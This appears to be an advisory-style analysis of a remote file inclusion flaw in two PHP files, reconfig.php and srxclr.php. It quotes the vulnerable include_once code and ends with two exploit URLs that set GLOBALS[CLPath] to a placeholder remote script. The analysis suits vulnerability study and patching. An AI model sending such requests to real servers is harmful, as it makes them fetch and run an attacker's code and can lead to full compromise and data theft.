Based on the provided content, here's a breakdown of the vulnerability:

*   **Root Cause:** The vulnerability lies in the insecure usage of the `$GLOBALS["CLPath"]` variable in `reconfig.php` and `srxclr.php`. This variable is used in `include_once` statements, and its value can be controlled by a remote attacker.

*   **Weaknesses/Vulnerabilities Present:** The primary weakness is **Remote File Inclusion (RFI)**. The application directly includes files based on a user-controlled path (`$GLOBALS["CLPath"]`), without proper sanitization or validation.

*   **Impact of Exploitation:** An attacker can inject a malicious URL into the `$GLOBALS["CLPath"]` variable, causing the server to include and execute arbitrary code from a remote server. This could lead to complete compromise of the server, including data theft, malware deployment, or denial of service.

*  **Attack Vectors:** The attack vector is through HTTP GET requests to `reconfig.php` or `srxclr.php`. The vulnerable parameter is `GLOBALS[CLPath]`.

*   **Required Attacker Capabilities/Position:**
    *   The attacker needs to be able to send HTTP requests to the server hosting the vulnerable application.
    *   The attacker needs to know the path to the vulnerable files (`reconfig.php` or `srxclr.php`).
    *   The attacker needs a server to host the malicious script to include.

**Technical Details:**

The provided code snippets show that the `$GLOBALS["CLPath"]` variable is used in `include_once` statements in `reconfig.php` and `srxclr.php`:

```php
// reconfig.php
include_once("./include/config.php");
include_once($GLOBALS["CLPath"]."/classes/session.php");
include_once($GLOBALS["CLPath"]."/include/gfunc.php");
include_once($GLOBALS["CLPath"]."/classes/calogicautomation.php");

// srxclr.php
include_once("./include/config.php");
include_once($GLOBALS["CLPath"]."/include/calfunc.php");
include_once($GLOBALS["CLPath"]."/include/gfunc.php");
include_once($GLOBALS["CLPath"]."/include/efuncs.php");
```

The exploit URLs demonstrate how an attacker can set the `$GLOBALS["CLPath"]` variable to a malicious URL:

```
http://site.com/[path]/reconfig.php?GLOBALS[CLPath]=[evil_script]
http://site.com/[path]/srxclr.php?GLOBALS[CLPath]=[evil_script]
```

This allows the attacker to include and execute code from `[evil_script]`.
